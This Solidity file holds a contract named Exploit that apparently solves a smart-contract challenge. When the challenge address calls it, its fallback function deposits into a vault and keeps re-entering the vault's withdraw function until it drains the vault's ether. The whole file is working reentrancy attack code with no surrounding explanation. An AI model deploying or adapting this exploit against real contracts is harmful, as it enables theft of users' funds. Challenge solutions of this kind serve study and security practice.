// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;

    function withdraw(uint256 value) external payable;
}

contract Exploit {
    address constant challengeAddress =
        0xfEeDC0DE00000000000000000000000000000000;
    address constant vault = 0x4330E5E62a8FB0219900b20f4c6C78D11Bf9D1f5;

    // temp state
    uint256 deposit;

    fallback() external payable {
        if (msg.sender == challengeAddress) {
            IVault(vault).deposit{value: (deposit = address(this).balance)}();
        }

        uint256 loot = vault.balance;
        uint256 amt = min(loot, deposit);
        if (amt > 0) {
            // Reenter the vulnerable contract's withdraw function
            IVault(vault).withdraw(amt);
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
